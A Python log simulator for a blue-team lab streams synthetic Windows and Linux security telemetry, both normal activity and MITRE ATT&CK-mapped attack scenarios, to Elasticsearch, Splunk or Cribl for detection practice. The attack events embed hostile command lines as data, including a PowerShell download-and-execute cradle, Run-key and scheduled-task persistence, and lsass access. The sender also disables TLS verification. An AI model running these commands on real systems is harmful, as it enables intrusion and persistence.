#!/usr/bin/env python3
"""
Blue Team Lab — Log Simulator
Generates realistic Windows/Linux security telemetry and streams it to
Elasticsearch and/or Splunk. Includes both baseline (normal) activity
and Fawkes C2 attack scenarios mapped to MITRE ATT&CK.

Modes:
  baseline  — Normal enterprise endpoint activity only
  attack    — Fawkes TTP attack scenarios only
  mixed     — Normal activity with periodic attack bursts (recommended)
"""

import base64
import json
import os
import random
import socket
import ssl
import sys
import time
import urllib.request
import urllib.error
from datetime import datetime, timezone
from uuid import uuid4

# ─── Configuration ───────────────────────────────────────────────────
ES_URL = os.getenv("ES_URL", "http://localhost:9200")
ES_USER = os.getenv("ES_USER", "")
ES_PASS = os.getenv("ES_PASS", "")
SPLUNK_HEC_URL = os.getenv("SPLUNK_HEC_URL", "")
SPLUNK_HEC_TOKEN = os.getenv("SPLUNK_HEC_TOKEN", "")
# Cribl Stream pipeline (optional). When set, all logs route through Cribl
# instead of directly to ES/Splunk. Cribl fans out to configured destinations.
CRIBL_HEC_URL = os.getenv("CRIBL_HEC_URL", "")
CRIBL_HEC_TOKEN = os.getenv("CRIBL_HEC_TOKEN", os.getenv("SPLUNK_HEC_TOKEN", "blue-team-lab-hec-token"))
SIM_MODE = os.getenv("SIM_MODE", "mixed")            # baseline | attack | mixed
SIM_EPS = int(os.getenv("SIM_EPS", "5"))              # events per second
SIM_ATTACK_INTERVAL = int(os.getenv("SIM_ATTACK_INTERVAL", "300"))  # seconds between attacks


def _es_auth_header():
    """Return Basic auth header dict if credentials are configured."""
    if ES_USER and ES_PASS:
        credentials = base64.b64encode(f"{ES_USER}:{ES_PASS}".encode()).decode()
        return {"Authorization": f"Basic {credentials}"}
    return {}


# ─── Simulated Environment ──────────────────────────────────────────
HOSTNAMES = [
    "WS-FINANCE-01", "WS-FINANCE-02", "WS-HR-01", "WS-DEV-01",
    "WS-DEV-02", "WS-EXEC-01", "SRV-DC-01", "SRV-FILE-01",
    "SRV-WEB-01", "SRV-DB-01", "LNX-WEB-01", "LNX-APP-01"
]

USERS = [
    ("jsmith", "CORP"), ("mjones", "CORP"), ("agarcia", "CORP"),
    ("bwilson", "CORP"), ("clee", "CORP"), ("dkim", "CORP"),
    ("admin", "CORP"), ("svc_backup", "CORP"), ("svc_sql", "CORP"),
    ("root", ""), ("www-data", ""),
]

NORMAL_PROCESSES = [
    ("explorer.exe", "C:\\Windows\\explorer.exe"),
    ("chrome.exe", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"),
    ("outlook.exe", "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"),
    ("teams.exe", "C:\\Users\\{user}\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe"),
    ("code.exe", "C:\\Users\\{user}\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe"),
    ("notepad.exe", "C:\\Windows\\System32\\notepad.exe"),
    ("svchost.exe", "C:\\Windows\\System32\\svchost.exe"),
    ("services.exe", "C:\\Windows\\System32\\services.exe"),
    ("lsass.exe", "C:\\Windows\\System32\\lsass.exe"),
    ("csrss.exe", "C:\\Windows\\System32\\csrss.exe"),
    ("taskhostw.exe", "C:\\Windows\\System32\\taskhostw.exe"),
    ("RuntimeBroker.exe", "C:\\Windows\\System32\\RuntimeBroker.exe"),
    ("SearchIndexer.exe", "C:\\Windows\\System32\\SearchIndexer.exe"),
    ("MsMpEng.exe", "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\MsMpEng.exe"),
]

LINUX_PROCESSES = [
    ("/usr/sbin/sshd", "sshd"), ("/usr/sbin/cron", "cron"),
    ("/usr/bin/python3", "python3"), ("/usr/sbin/nginx", "nginx"),
    ("/usr/bin/bash", "bash"), ("/usr/bin/sudo", "sudo"),
    ("/usr/bin/apt-get", "apt-get"), ("/usr/bin/systemctl", "systemctl"),
]

INTERNAL_IPS = [f"10.10.{random.randint(1,5)}.{random.randint(10,250)}" for _ in range(20)]
EXTERNAL_IPS = [f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}" for _ in range(10)]


def now_iso():
    return datetime.now(timezone.utc).isoformat()


def random_pid():
    return random.randint(100, 65000)


# ─── Output Sinks ───────────────────────────────────────────────────
def send_to_elasticsearch(events, index="sim-baseline"):
    """Bulk send events to Elasticsearch."""
    try:
        bulk_body = ""
        for event in events:
            bulk_body += json.dumps({"index": {"_index": index}}) + "\n"
            bulk_body += json.dumps(event) + "\n"

        headers = {"Content-Type": "application/x-ndjson"}
        headers.update(_es_auth_header())
        req = urllib.request.Request(
            f"{ES_URL}/_bulk",
            data=bulk_body.encode(),
            headers=headers,
            method="POST"
        )
        urllib.request.urlopen(req, timeout=5)
    except Exception as e:
        print(f"  [!] ES send failed: {e}", file=sys.stderr)


def send_to_hec(url, token, events, index="main", sourcetype="simulation"):
    """Send events to a Splunk-compatible HEC endpoint (Splunk or Cribl)."""
    if not url or not token:
        return
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        for event in events:
            payload = json.dumps({
                "event": event,
                "index": index,
                "sourcetype": sourcetype,
                "time": time.time()
            })
            req = urllib.request.Request(
                f"{url}/services/collector/event",
                data=payload.encode(),
                headers={
                    "Authorization": f"Splunk {token}",
                    "Content-Type": "application/json"
                },
                method="POST"
            )
            # Use SSL context only for https
            if url.startswith("https"):
                urllib.request.urlopen(req, timeout=5, context=ctx)
            else:
                urllib.request.urlopen(req, timeout=5)
    except Exception as e:
        dest = "Cribl HEC" if url == CRIBL_HEC_URL else "Splunk HEC"
        print(f"  [!] {dest} send failed: {e}", file=sys.stderr)


def send_to_splunk(events, index="main", sourcetype="simulation"):
    """Send events to Splunk via HEC."""
    send_to_hec(SPLUNK_HEC_URL, SPLUNK_HEC_TOKEN, events, index, sourcetype)


def send_to_cribl(events, index="main", sourcetype="simulation"):
    """Send events to Cribl Stream HEC input (routes to all configured destinations)."""
    send_to_hec(CRIBL_HEC_URL, CRIBL_HEC_TOKEN, events, index, sourcetype)


def emit(events, index="sim-baseline", splunk_index="main", sourcetype="simulation"):
    """Send events to configured SIEM backends.

    When CRIBL_HEC_URL is set, route exclusively through Cribl Stream.
    Cribl handles fan-out to Elastic and/or Splunk per its pipeline config.
    When Cribl is not configured, send directly to Elastic and/or Splunk.
    """
    if CRIBL_HEC_URL:
        # Route through Cribl pipeline — avoids duplicates in ES/Splunk
        send_to_cribl(events, splunk_index, sourcetype)
    else:
        # Direct delivery to each configured SIEM
        if ES_URL:
            send_to_elasticsearch(events, index)
        if SPLUNK_HEC_URL:
            send_to_splunk(events, splunk_index, sourcetype)


# ─── Baseline Event Generators ──────────────────────────────────────
def gen_process_create_normal():
    """Normal process creation — svchost, chrome, office, etc."""
    host = random.choice(HOSTNAMES[:8])  # Windows hosts
    user, domain = random.choice(USERS[:6])
    proc_name, proc_path = random.choice(NORMAL_PROCESSES[:8])
    parent_name, parent_path = random.choice([
        ("explorer.exe", "C:\\Windows\\explorer.exe"),
        ("svchost.exe", "C:\\Windows\\System32\\svchost.exe"),
        ("services.exe", "C:\\Windows\\System32\\services.exe"),
    ])
    return {
        "@timestamp": now_iso(),
        "event": {"category": "process", "type": "start", "action": "Process Create (rule: ProcessCreate)", "code": "1"},
        "process": {
            "pid": random_pid(),
            "name": proc_name,
            "executable": proc_path.format(user=user),
            "command_line": proc_path.format(user=user),
            "parent": {"pid": random_pid(), "name": parent_name, "executable": parent_path}
        },
        "user": {"name": user, "domain": domain},
        "host": {"name": host, "os": {"platform": "windows"}},
        "log": {"level": "information"},
        "agent": {"type": "sysmon"},
        "_simulation": {"type": "baseline", "label": "normal_process_create"}
    }


def gen_network_connection_normal():
    """Normal outbound network — browsing, updates, O365."""
    host = random.choice(HOSTNAMES[:8])
    user, domain = random.choice(USERS[:6])
    dest_port = random.choice([80, 443, 443, 443, 8080, 53])
    return {
        "@timestamp": now_iso(),
        "event": {"category": "network", "type": "connection", "action": "Network connection detected (rule: NetworkConnect)", "code": "3"},
        "process": {"name": random.choice(["chrome.exe", "outlook.exe", "teams.exe", "svchost.exe"]), "pid": random_pid()},
        "source": {"ip": random.choice(INTERNAL_IPS), "port": random.randint(49152, 65535)},
        "destination": {"ip": random.choice(EXTERNAL_IPS), "port": dest_port},
        "network": {"direction": "outbound", "transport": "tcp"},
        "user": {"name": user, "domain": domain},
        "host": {"name": host, "os": {"platform": "windows"}},
        "agent": {"type": "sysmon"},
        "_simulation": {"type": "baseline", "label": "normal_network"}
    }


def gen_registry_normal():
    """Normal registry access — software installs, settings."""
    host = random.choice(HOSTNAMES[:8])
    return {
        "@timestamp": now_iso(),
        "event": {"category": "registry", "type": "change", "action": "Registry value set (rule: RegistryEvent)", "code": "13"},
        "registry": {
            "path": random.choice([
                "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{guid}",
                "HKCU\\Software\\Microsoft\\Office\\16.0\\Common\\General",
                "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters",
                "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced",
            ]),
        },
        "process": {"name": random.choice(["explorer.exe", "msiexec.exe", "reg.exe"]), "pid": random_pid()},
        "host": {"name": host, "os": {"platform": "windows"}},
        "agent": {"type": "sysmon"},
        "_simulation": {"type": "baseline", "label": "normal_registry"}
    }


def gen_logon_normal():
    """Normal logon events."""
    host = random.choice(HOSTNAMES[:8])
    user, domain = random.choice(USERS[:6])
    return {
        "@timestamp": now_iso(),
        "event": {"category": "authentication", "type": "start", "action": "logged-in", "code": "4624", "outcome": "success"},
        "winlog": {"logon": {"type": "Interactive", "id": hex(random.randint(0x10000, 0xFFFFF))}},
        "source": {"ip": random.choice(INTERNAL_IPS)},
        "user": {"name": user, "domain": domain},
        "host": {"name": host, "os": {"platform": "windows"}},
        "agent": {"type": "winlogbeat"},
        "_simulation": {"type": "baseline", "label": "normal_logon"}
    }


def gen_linux_normal():
    """Normal Linux activity — cron, ssh, web server."""
    host = random.choice(HOSTNAMES[10:])
    proc_path, proc_name = random.choice(LINUX_PROCESSES)
    user = random.choice(["root", "www-data", "ubuntu", "deploy"])
    return {
        "@timestamp": now_iso(),
        "event": {"category": "process", "type": "start", "action": "exec"},
        "process": {"name": proc_name, "executable": proc_path, "pid": random_pid(),
                     "command_line": f"{proc_path} " + random.choice(["--daemon", "-c /etc/nginx/nginx.conf", "update", "-l"])},
        "user": {"name": user},
        "host": {"name": host, "os": {"platform": "linux"}},
        "agent": {"type": "auditbeat"},
        "_simulation": {"type": "baseline", "label": "normal_linux"}
    }


BASELINE_GENERATORS = [
    (gen_process_create_normal, 30),
    (gen_network_connection_normal, 25),
    (gen_registry_normal, 10),
    (gen_logon_normal, 10),
    (gen_linux_normal, 15),
]


def generate_baseline_event():
    """Weighted random selection of baseline event generators."""
    generators, weights = zip(*BASELINE_GENERATORS)
    gen = random.choices(generators, weights=weights, k=1)[0]
    return gen()


# ─── Attack Scenario Generators (Fawkes TTPs) ───────────────────────
def attack_process_injection():
    """Fawkes vanilla-injection — VirtualAllocEx + WriteProcessMemory + CreateRemoteThread (T1055.001)"""
    host = random.choice(HOSTNAMES[:8])
    user, domain = random.choice(USERS[:3])
    src_proc = random.choice(["update_helper.exe", "sync_agent.exe", "notepad.exe"])
    target_proc = random.choice(["explorer.exe", "svchost.exe", "RuntimeBroker.exe"])
    events = [
        {  # ProcessAccess (Sysmon 10) — source opens target for injection
            "@timestamp": now_iso(),
            "event": {"category": "process", "type": "access", "action": "Process accessed (rule: ProcessAccess)", "code": "10"},
            "process": {"name": src_proc, "executable": f"C:\\Users\\{user}\\AppData\\Local\\Temp\\{src_proc}", "pid": random_pid()},
            "winlog": {"event_data": {
                "TargetImage": f"C:\\Windows\\System32\\{target_proc}",
                "GrantedAccess": "0x1F3FFF",  # PROCESS_ALL_ACCESS
                "SourceProcessGUID": str(uuid4()),
            }},
            "user": {"name": user, "domain": domain},
            "host": {"name": host, "os": {"platform": "windows"}},
            "agent": {"type": "sysmon"},
            "_simulation": {"type": "attack", "technique": "T1055.001", "fawkes_command": "vanilla-injection", "label": "process_injection_access"}
        },
        {  # CreateRemoteThread (Sysmon 8)
            "@timestamp": now_iso(),
            "event": {"category": "process", "type": "change", "action": "CreateRemoteThread detected (rule: CreateRemoteThread)", "code": "8"},
            "process": {"name": src_proc, "executable": f"C:\\Users\\{user}\\AppData\\Local\\Temp\\{src_proc}", "pid": random_pid()},
            "winlog": {"event_data": {
                "TargetImage": f"C:\\Windows\\System32\\{target_proc}",
                "StartAddress": hex(random.randint(0x7FF600000000, 0x7FF6FFFFFFFF)),
                "StartModule": "",
                "StartFunction": "",
            }},
            "user": {"name": user, "domain": domain},
            "host": {"name": host, "os": {"platform": "windows"}},
            "agent": {"type": "sysmon"},
            "_simulation": {"type": "attack", "technique": "T1055.001", "fawkes_command": "vanilla-injection", "label": "create_remote_thread"}
        },
    ]
    return events


def attack_persistence_registry():
    """Fawkes persist -method registry — Registry Run key (T1547.001)"""
    host = random.choice(HOSTNAMES[:8])
    user, domain = random.choice(USERS[:3])
    malicious_path = random.choice([
        f"C:\\Users\\{user}\\AppData\\Local\\Temp\\update_svc.exe",
        f"C:\\ProgramData\\WindowsUpdate\\svchost.exe",
        f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\helper.exe",
    ])
    return [{
        "@timestamp": now_iso(),
        "event": {"category": "registry", "type": "change", "action": "Registry value set (rule: RegistryEvent)", "code": "13"},
        "registry": {
            "path": random.choice([
                "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate",
                "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemHelper",
                "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\Updater",
            ]),
            "value": malicious_path,
        },
        "process": {"name": "reg.exe", "executable": "C:\\Windows\\System32\\reg.exe", "pid": random_pid(),
                     "command_line": f'reg.exe add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v WindowsUpdate /d "{malicious_path}" /f'},
        "user": {"name": user, "domain": domain},
        "host": {"name": host, "os": {"platform": "windows"}},
        "agent": {"type": "sysmon"},
        "_simulation": {"type": "attack", "technique": "T1547.001", "fawkes_command": "persist -method registry", "label": "registry_run_key"}
    }]


def attack_powershell_execution():
    """Fawkes powershell command — suspicious PowerShell (T1059.001)"""
    host = random.choice(HOSTNAMES[:8])
    user, domain = random.choice(USERS[:3])
    cmds = [
        "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAo...",
        "powershell.exe -nop -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.1.50/payload.ps1')",
        "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Get-Process | Where-Object {$_.ProcessName -eq 'lsass'}\"",
    ]
    cmd = random.choice(cmds)
    return [{
        "@timestamp": now_iso(),
        "event": {"category": "process", "type": "start", "action": "Process Create (rule: ProcessCreate)", "code": "1"},
        "process": {
            "pid": random_pid(), "name": "powershell.exe",
            "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "command_line": cmd,
            "parent": {"pid": random_pid(), "name": "cmd.exe", "executable": "C:\\Windows\\System32\\cmd.exe"}
        },
        "user": {"name": user, "domain": domain},
        "host": {"name": host, "os": {"platform": "windows"}},
        "agent": {"type": "sysmon"},
        "_simulation": {"type": "attack", "technique": "T1059.001", "fawkes_command": "powershell", "label": "suspicious_powershell"}
    }]


def attack_scheduled_task():
    """Fawkes schtask -action create — Scheduled task persistence (T1053.005)"""
    host = random.choice(HOSTNAMES[:8])
    user, domain = random.choice(USERS[:3])
    return [{
        "@timestamp": now_iso(),
        "event": {"category": "process", "type": "start", "action": "Process Create (rule: ProcessCreate)", "code": "1"},
        "process": {
            "pid": random_pid(), "name": "schtasks.exe",
            "executable": "C:\\Windows\\System32\\schtasks.exe",
            "command_line": f'schtasks.exe /Create /TN "\\Microsoft\\Windows\\Maintenance\\SystemUpdate" /TR "C:\\Users\\{user}\\AppData\\Local\\Temp\\update.exe" /SC ONLOGON /RL HIGHEST',
            "parent": {"pid": random_pid(), "name": "cmd.exe", "executable": "C:\\Windows\\System32\\cmd.exe"}
        },
        "user": {"name": user, "domain": domain},
        "host": {"name": host, "os": {"platform": "windows"}},
        "agent": {"type": "sysmon"},
        "_simulation": {"type": "attack", "technique": "T1053.005", "fawkes_command": "schtask", "label": "scheduled_task_create"}
    }]


def attack_discovery_burst():
    """Fawkes discovery commands in rapid succession — ps, whoami, net-enum, arp (T1057, T1033, T1087, T1016)"""
    host = random.choice(HOSTNAMES[:8])
    user, domain = random.choice(USERS[:3])
    ts = now_iso()
    commands = [
        ("whoami.exe", "whoami.exe /all", "T1033", "whoami"),
        ("net.exe", "net.exe user /domain", "T1087.002", "net-enum"),
        ("net.exe", "net.exe localgroup administrators", "T1087.001", "net-enum"),
        ("arp.exe", "arp.exe -a", "T1016", "arp"),
        ("tasklist.exe", "tasklist.exe /v", "T1057", "ps"),
        ("ipconfig.exe", "ipconfig.exe /all", "T1016", "ifconfig"),
        ("netstat.exe", "netstat.exe -ano", "T1049", "net-stat"),
    ]
    events = []
    for proc_name, cmd_line, technique, fawkes_cmd in commands:
        events.append({
            "@timestamp": ts,
            "event": {"category": "process", "type": "start", "action": "Process Create (rule: ProcessCreate)", "code": "1"},
            "process": {
                "pid": random_pid(), "name": proc_name,
                "executable": f"C:\\Windows\\System32\\{proc_name}",
                "command_line": cmd_line,
                "parent": {"pid": random_pid(), "name": "cmd.exe", "executable": "C:\\Windows\\System32\\cmd.exe"}
            },
            "user": {"name": user, "domain": domain},
            "host": {"name": host, "os": {"platform": "windows"}},
            "agent": {"type": "sysmon"},
            "_simulation": {"type": "attack", "technique": technique, "fawkes_command": fawkes_cmd, "label": "discovery_burst"}
        })
    return events


def attack_token_theft():
    """Fawkes steal-token — Token impersonation (T1134.001)"""
    host = random.choice(HOSTNAMES[:8])
    user, domain = random.choice(USERS[:3])
    return [{
        "@timestamp": now_iso(),
        "event": {"category": "process", "type": "access", "action": "Process accessed (rule: ProcessAccess)", "code": "10"},
        "process": {"name": "update_helper.exe", "executable": f"C:\\Users\\{user}\\AppData\\Local\\Temp\\update_helper.exe", "pid": random_pid()},
        "winlog": {"event_data": {
            "TargetImage": "C:\\Windows\\System32\\lsass.exe",
            "GrantedAccess": "0x0040",  # PROCESS_DUP_HANDLE for token theft
        }},
        "user": {"name": user, "domain": domain},
        "host": {"name": host, "os": {"platform": "windows"}},
        "agent": {"type": "sysmon"},
        "_simulation": {"type": "attack", "technique": "T1134.001", "fawkes_command": "steal-token", "label": "token_theft"}
    }]


def attack_c2_beacon():
    """Fawkes HTTP C2 — Regular beaconing pattern (T1071.001)"""
    host = random.choice(HOSTNAMES[:8])
    c2_ip = "185.199.108.42"  # simulated C2
    events = []
    for _ in range(random.randint(3, 6)):
        events.append({
            "@timestamp": now_iso(),
            "event": {"category": "network", "type": "connection", "action": "Network connection detected (rule: NetworkConnect)", "code": "3"},
            "process": {"name": "update_helper.exe", "pid": random_pid()},
            "source": {"ip": random.choice(INTERNAL_IPS), "port": random.randint(49152, 65535)},
            "destination": {"ip": c2_ip, "port": 443},
            "network": {"direction": "outbound", "transport": "tcp"},
            "host": {"name": host, "os": {"platform": "windows"}},
            "agent": {"type": "sysmon"},
            "_simulation": {"type": "attack", "technique": "T1071.001", "fawkes_command": "sleep", "label": "c2_beacon"}
        })
        time.sleep(random.uniform(0.5, 2.0))  # Simulate jittered beaconing
    return events


def attack_amsi_patch():
    """Fawkes start-clr with AMSI patch — defense evasion (T1562.001)"""
    host = random.choice(HOSTNAMES[:8])
    user, domain = random.choice(USERS[:3])
    events = [
        {  # CLR loading in unusual process
            "@timestamp": now_iso(),
            "event": {"category": "process", "type": "change", "action": "Image loaded (rule: ImageLoad)", "code": "7"},
            "file": {"name": "clr.dll", "path": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.dll"},
            "process": {"name": "update_helper.exe", "executable": f"C:\\Users\\{user}\\AppData\\Local\\Temp\\update_helper.exe", "pid": random_pid()},
            "user": {"name": user, "domain": domain},
            "host": {"name": host, "os": {"platform": "windows"}},
            "agent": {"type": "sysmon"},
            "_simulation": {"type": "attack", "technique": "T1562.001", "fawkes_command": "start-clr", "label": "clr_load_unusual_process"}
        },
        {  # AMSI.dll loaded then patched
            "@timestamp": now_iso(),
            "event": {"category": "process", "type": "change", "action": "Image loaded (rule: ImageLoad)", "code": "7"},
            "file": {"name": "amsi.dll", "path": "C:\\Windows\\System32\\amsi.dll"},
            "process": {"name": "update_helper.exe", "executable": f"C:\\Users\\{user}\\AppData\\Local\\Temp\\update_helper.exe", "pid": random_pid()},
            "user": {"name": user, "domain": domain},
            "host": {"name": host, "os": {"platform": "windows"}},
            "agent": {"type": "sysmon"},
            "_simulation": {"type": "attack", "technique": "T1562.001", "fawkes_command": "start-clr", "label": "amsi_load_patch"}
        },
    ]
    return events


ATTACK_SCENARIOS = [
    ("Process Injection (T1055.001)", attack_process_injection),
    ("Registry Persistence (T1547.001)", attack_persistence_registry),
    ("PowerShell Execution (T1059.001)", attack_powershell_execution),
    ("Scheduled Task (T1053.005)", attack_scheduled_task),
    ("Discovery Burst (T1057+)", attack_discovery_burst),
    ("Token Theft (T1134.001)", attack_token_theft),
    ("C2 Beacon (T1071.001)", attack_c2_beacon),
    ("AMSI Patch (T1562.001)", attack_amsi_patch),
]


def run_attack_scenario():
    """Run a random attack scenario."""
    name, generator = random.choice(ATTACK_SCENARIOS)
    print(f"  [*] Attack scenario: {name}")
    events = generator()
    emit(events, index="sim-attack", splunk_index="attack_simulation", sourcetype="sysmon")
    return len(events)


# ─── Index Template ──────────────────────────────────────────────────
def ensure_index_template():
    """Create index template for sim-* with correct ECS field mappings."""
    template = {
        "index_patterns": ["sim-*"],
        "priority": 500,
        "template": {
            "settings": {"number_of_shards": 1, "number_of_replicas": 0},
            "mappings": {
                "properties": {
                    "@timestamp": {"type": "date"},
                    "event.category": {"type": "keyword"},
                    "event.type": {"type": "keyword"},
                    "event.action": {"type": "keyword"},
                    "event.code": {"type": "keyword"},
                    "event.outcome": {"type": "keyword"},
                    "process.pid": {"type": "long"},
                    "process.name": {"type": "keyword"},
                    "process.executable": {"type": "keyword"},
                    "process.command_line": {"type": "text", "fields": {"keyword": {"type": "keyword", "ignore_above": 1024}}},
                    "process.parent.pid": {"type": "long"},
                    "process.parent.name": {"type": "keyword"},
                    "process.parent.executable": {"type": "keyword"},
                    "user.name": {"type": "keyword"},
                    "user.domain": {"type": "keyword"},
                    "host.name": {"type": "keyword"},
                    "host.os.platform": {"type": "keyword"},
                    "source.ip": {"type": "ip"},
                    "source.port": {"type": "long"},
                    "destination.ip": {"type": "ip"},
                    "destination.port": {"type": "long"},
                    "registry.path": {"type": "keyword"},
                    "registry.value": {"type": "keyword"},
                    "file.name": {"type": "keyword"},
                    "file.path": {"type": "keyword"},
                    "network.direction": {"type": "keyword"},
                    "network.transport": {"type": "keyword"},
                    "agent.type": {"type": "keyword"},
                    "log.level": {"type": "keyword"},
                    "winlog.logon.type": {"type": "keyword"},
                    "winlog.logon.id": {"type": "keyword"},
                    "winlog.event_data.TargetImage": {"type": "keyword"},
                    "winlog.event_data.GrantedAccess": {"type": "keyword"},
                    "winlog.event_data.StartAddress": {"type": "keyword"},
                    "winlog.event_data.StartModule": {"type": "keyword"},
                    "winlog.event_data.StartFunction": {"type": "keyword"},
                    "winlog.event_data.SourceProcessGUID": {"type": "keyword"},
                    "_simulation.type": {"type": "keyword"},
                    "_simulation.technique": {"type": "keyword"},
                    "_simulation.fawkes_command": {"type": "keyword"},
                    "_simulation.label": {"type": "keyword"}
                }
            }
        }
    }
    try:
        headers = {"Content-Type": "application/json"}
        headers.update(_es_auth_header())
        req = urllib.request.Request(
            f"{ES_URL}/_index_template/sim-logs",
            data=json.dumps(template).encode(),
            headers=headers,
            method="PUT"
        )
        urllib.request.urlopen(req, timeout=10)
        print("  [+] Index template 'sim-logs' created/updated")
    except Exception as e:
        print(f"  [!] Index template creation failed: {e}", file=sys.stderr)


# ─── Main Loop ───────────────────────────────────────────────────────
def _check_es():
    """Check Elasticsearch connectivity."""
    if not ES_URL:
        return False
    try:
        headers = _es_auth_header()
        req = urllib.request.Request(f"{ES_URL}/_cluster/health", headers=headers)
        urllib.request.urlopen(req, timeout=5)
        print(f"  [+] Elasticsearch: {ES_URL}")
        return True
    except Exception:
        print(f"  [-] Elasticsearch not reachable at {ES_URL}")
        return False


def _check_cribl():
    """Check Cribl HEC connectivity."""
    if not CRIBL_HEC_URL:
        return False
    try:
        hec_health_url = CRIBL_HEC_URL.rstrip("/") + "/services/collector/health/1.0"
        req = urllib.request.Request(
            hec_health_url,
            headers={"Authorization": f"Splunk {CRIBL_HEC_TOKEN}"}
        )
        urllib.request.urlopen(req, timeout=5)
        print(f"  [+] Cribl HEC: {CRIBL_HEC_URL} (routing to all configured destinations)")
        return True
    except Exception:
        print(f"  [-] Cribl HEC not reachable at {CRIBL_HEC_URL}")
        return False


def _check_splunk():
    """Check Splunk HEC connectivity."""
    if not SPLUNK_HEC_URL:
        return False
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        hec_health_url = SPLUNK_HEC_URL.rstrip("/") + "/services/collector/health/1.0"
        req = urllib.request.Request(
            hec_health_url,
            headers={"Authorization": f"Splunk {SPLUNK_HEC_TOKEN}"}
        )
        if SPLUNK_HEC_URL.startswith("https"):
            urllib.request.urlopen(req, timeout=5, context=ctx)
        else:
            urllib.request.urlopen(req, timeout=5)
        print(f"  [+] Splunk HEC: {SPLUNK_HEC_URL}")
        return True
    except Exception:
        print(f"  [-] Splunk HEC not reachable at {SPLUNK_HEC_URL}")
        return False


def main():
    global CRIBL_HEC_URL

    print("=" * 60)
    print("  Blue Team Lab — Log Simulator")
    print(f"  Mode: {SIM_MODE} | EPS: {SIM_EPS} | Attack interval: {SIM_ATTACK_INTERVAL}s")
    print("=" * 60)

    # Wait for at least one backend to be reachable
    print("\n[*] Checking SIEM connectivity...")
    retries = 0
    while True:
        es_ok = _check_es()
        cribl_ok = _check_cribl()
        splunk_ok = _check_splunk() if not cribl_ok else False

        if es_ok or cribl_ok or splunk_ok:
            break
        retries += 1
        if retries > 30:
            print("[!] No SIEM backend reachable after 30 retries. Exiting.")
            sys.exit(1)
        print(f"  [.] Waiting for SIEM backends... (attempt {retries}/30)")
        time.sleep(10)

    # If Cribl is configured but not reachable after initial check, give it extra time
    # (Cribl HEC listener starts after the health endpoint)
    if CRIBL_HEC_URL and not cribl_ok:
        print("  [*] Cribl configured but HEC not ready — waiting up to 60s...")
        for i in range(6):
            time.sleep(10)
            if _check_cribl():
                cribl_ok = True
                break
        if not cribl_ok:
            print("  [*] Cribl HEC not available — falling back to direct SIEM delivery")
            CRIBL_HEC_URL = ""

    # Create index template before sending events
    if ES_URL:
        ensure_index_template()

    print(f"\n[*] Starting simulation...")

    total_events = 0
    total_attacks = 0
    last_attack = time.time()

    while True:
        try:
            batch = []
            batch_size = max(1, SIM_EPS)

            if SIM_MODE in ("baseline", "mixed"):
                for _ in range(batch_size):
                    batch.append(generate_baseline_event())

            if SIM_MODE == "attack":
                events = run_attack_scenario()
                total_attacks += 1
                total_events += events
                time.sleep(random.uniform(5, 15))
                continue

            # Mixed mode: periodic attack bursts
            if SIM_MODE == "mixed" and (time.time() - last_attack) >= SIM_ATTACK_INTERVAL:
                attack_events = run_attack_scenario()
                total_attacks += 1
                total_events += attack_events
                last_attack = time.time()

            # Send baseline batch
            if batch:
                emit(batch, index="sim-baseline", splunk_index="sysmon", sourcetype="sysmon")
                total_events += len(batch)

            if total_events % 100 == 0 and total_events > 0:
                print(f"  [+] Total events: {total_events} | Attack scenarios: {total_attacks}")

            time.sleep(1.0 / max(1, SIM_EPS) * batch_size)

        except KeyboardInterrupt:
            print(f"\n[*] Simulator stopped. Total: {total_events} events, {total_attacks} attack scenarios.")
            break
        except Exception as e:
            print(f"  [!] Error: {e}", file=sys.stderr)
            time.sleep(5)


if __name__ == "__main__":
    main()
